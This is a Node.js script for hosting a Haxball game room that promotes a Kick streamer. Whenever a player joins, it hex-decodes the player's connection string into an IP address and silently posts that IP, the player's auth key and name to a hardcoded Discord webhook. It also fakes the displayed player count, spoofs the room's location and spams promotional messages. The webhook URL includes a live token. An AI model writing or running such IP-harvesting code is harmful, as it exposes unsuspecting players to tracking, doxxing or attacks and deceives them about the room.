const Haxball = require("node-haxball"); // Cambiado para usar la librería oficial
const axios = require("axios");

// Inicializamos la API y configuramos el idioma
const API = Haxball();
const { Room } = API;

// Opcional: Configuración de idioma si la librería lo soporta igual
// const EnglishLanguage = require("./languages/englishLanguage");
// API.Language.current = new EnglishLanguage(API);

function decryptHex(str) {
    if (!str || typeof str !== "string") return "";
    let out = "";
    for (let i = 0; i < str.length; i += 2) {
        out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
    }
    return out;
}

async function sendDiscordRaw(webhookUrl, body) {
    if (!webhookUrl) return;
    try {
        await axios.post(webhookUrl, body, { timeout: 10000 });
        return true;
    } catch (err) {
        console.error("❌ Error enviando webhook:", err?.message || err);
        return false;
    }
}

async function sendDiscordPlayer(webhookUrl, player, roomName) {
    if (!webhookUrl) return;
    const payload = {
        content: `🚀 Nuevo jugador conectado: **${player.name}** en ${roomName}`,
        embeds: [
            {
                title: "🎯 Nuevo Jugador Conectado",
                color: 0xff0000,
                fields: [
                    { name: "Nombre", value: player.name || "N/A", inline: true },
                    { name: "ID", value: String(player.id || "N/A"), inline: true },
                    { name: "Auth", value: player.auth || "N/A", inline: true },
                    { name: "Conn", value: player.conn || "No tiene", inline: true },
                    { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
            }
        ]
    };
    await sendDiscordRaw(webhookUrl, payload);
}

async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
    if (!webhookUrl) return;
    const payload = {
        content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
        embeds: [
            {
                title: "Sala creada",
                color: 0x00ffff,
                fields: [{ name: "Link", value: roomLink, inline: false }],
                timestamp: new Date().toISOString(),
                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
            }
        ]
    };
    await sendDiscordRaw(webhookUrl, payload);
}

/* ---------- Config (modificable / rotativo por INDEX) ---------- */

const roomNames = [
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢",
    "🟢 KICK: agruck ON 🟢"
];

const geoList = [
    { lat: -34.5082740783691, lon: -58.427734375, flag: "AR" },
    { lat: -34.6300010681152, lon: -58.3804016113281, flag: "AR" },
    { lat: -32.9468193054199, lon: -60.6393203735352, flag: "AR" }
];

const maxPlayersList = [12, 12, 12, 12, 12];
const fakePlayersList = [9, 9, 9, 9, 9];

/* ---------- Env / selección por index ---------- */

const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
const token = process.env.RECAPTCHA_TOKEN || process.env.HAXBALL_TOKEN;

const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";

const roomName = roomNames[jobIndex % roomNames.length];
const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
const geo = geoList[jobIndex % geoList.length];

if (!token) {
    console.error("❌ No se encontró token (RECAPTCHA_TOKEN).");
    process.exit(1);
}

console.log(`🚀 Creando sala con node-haxball: ${roomName} | Geo: ${geo.lat}, ${geo.lon}`);

/* ---------- Crear sala ---------- */

Room.create(
{
    name: roomName,
    password: process.env.ROOM_PASSWORD || "",
    maxPlayerCount: maxPlayers,
    playerCount: fakePlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: token
},
{
    storage: {
        player_name: process.env.PLAYER_NAME || "Teleese",
        avatar: process.env.PLAYER_AVATAR || "🚨"
    },
    onOpen: (room) => {
        console.log("✅ Sala abierta.");

        room.onAfterRoomLink = (roomLink) => {
            console.log("🔗 Link:", roomLink);
            if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
        };

        room.onPlayerJoin = (playerObj) => {
            sendDiscordPlayer(webhookUrl, playerObj, roomName);
            
            const mensajes = [
                "🟢🟢🟢 BIENVENIDO REY 🟢🟢🟢",
                "💚 MIRÁ EL STREAM EN VIVO AHORA DE kick.com/agruck 💚",
                "🟢 SALA EN KICK ACTIVA: www.haxball.com/play?c=MsABokfCpe4",
                "💚 SEGUINOS EN KICK: kick.com/agruck 💚"
            ];

            let i = 0, contador = 0;
            const spam = setInterval(() => {
                room.sendAnnouncement(` ${mensajes[i]} `, null, 0xff0000, "bold", 2);
                i = (i + 1) % mensajes.length;
                if (++contador >= 6) clearInterval(spam);
            }, 1500);
        };

        room.onRoomError = (err) => console.error("❌ Error:", err);
    },
    onClose: (msg) => {
        console.log("🔴 Sala cerrada:", msg);
        process.exit(0);
    }
});
